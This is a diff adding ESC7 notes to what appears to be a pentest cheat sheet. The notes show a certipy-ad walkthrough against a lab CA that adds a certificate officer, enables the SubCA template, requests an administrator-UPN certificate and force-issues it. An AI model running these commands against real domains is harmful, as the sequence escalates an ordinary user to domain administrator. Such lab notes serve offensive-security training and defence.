@@ -233,6 +233,67 @@ certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.130.136
 
 ------------------
 
+### ESC 7: Vulnerable Certificate Authority Access Control
 
+-------------------
+
+- ESC7 is a critical security vulnerability where attackers exploit weak access controls within Certificate Authorities (CAs). By targeting key permissions like ManageCA and Manage Certificates, attackers can compromise certificate management systems. The ManageCA permission grants administrative control, allowing attackers to modify settings like EDITF_ATTRIBUTESUBJECTALTNAME2 and exploit vulnerabilities such as ESC6 using PSPKI cmdlets. Meanwhile, ManageCertificates enables attackers to bypass certificate issuance checks, weakening security.
+- Exploiting it-:
+
+- Running `certipy-ad find` to find issues-:
+
+<img width="1365" height="456" alt="image" src="https://github.com/user-attachments/assets/b46ff150-a163-48f8-bf8b-256201860dae" />
+
+- Abusing `ManageCA` by adding a certificate officer-:
+
+```bash
+certipy-ad  ca -ca LAB-ROOT-CA -add-officer dev -u dev@papa.local -p password -target 192.168.130.136 -dc-ip 192.168.130.136
+```
+
+<img width="1354" height="157" alt="image" src="https://github.com/user-attachments/assets/101d651d-ca0e-4fd7-806d-ed8963176240" />
+
+- Add a vulnerable template
+
+```bash
+certipy-ad ca -ca LAB-ROOT-CA -u dev@papa.local -p password -target 192.168.130.136 -enable-template SubCA -dc-ip 192.168.130.136
+```
+
+<img width="1309" height="147" alt="image" src="https://github.com/user-attachments/assets/f0b0ac1d-0615-4cd7-86a5-1ff7e352dbe3" />
+
+- Find enabled templates-:
+
+```bash
+certipy-ad find -u "dev" -p "password" -dc-ip "192.168.130.136" -enabled
+```
+
+<img width="1055" height="825" alt="image" src="https://github.com/user-attachments/assets/3eff98c9-7a06-481b-9e4e-7454a5183110" />
+
+- Sometimes, you can request for certificate straight up but you might be restricted at times.
+
+```bash
+certipy-ad req -u 'dev@papa.local' -p 'password' -dc-ip 192.168.130.136 -ca LAB-ROOT-CA -target 'DC01.papa.local' -template 'SubCA' -upn 'administrator@papa.local'
+```
+
+<img width="1905" height="278" alt="image" src="https://github.com/user-attachments/assets/815b7684-9461-41a0-973f-a6ce980f9f6c" />
+
+- Issue and retrieve it-:
+  - Issuing it, however, armed with the necessary CA permissions, we can bypass restrictions by either forcing or manually approving the Certificate Authority (CA) to authorise the certificate request.
+    ```bash
+    certipy-ad ca  -u dev@papa.local -p password -ca LAB-ROOT-CA -target 192.168.130.136 -issue-request 8 -dc-ip 192.168.130.136
+    ```
+    <img width="1421" height="147" alt="image" src="https://github.com/user-attachments/assets/d45a4abe-c0d0-4642-b629-3d767009ad92" />
+  - Now, reissue it, note your request id-:
+
+  ```bash
+  certipy-ad req -u 'dev@papa.local' -p 'password' -dc-ip 192.168.130.136 -ca LAB-ROOT-CA -target 'DC01.papa.local' -template 'SubCA' -retrieve 8 
+  ```
+  <img width="1910" height="307" alt="image" src="https://github.com/user-attachments/assets/afdc2411-7fdd-444d-a350-e9cbd844e672" />
+
+- 
+
+
+
+
+------------------
 
 
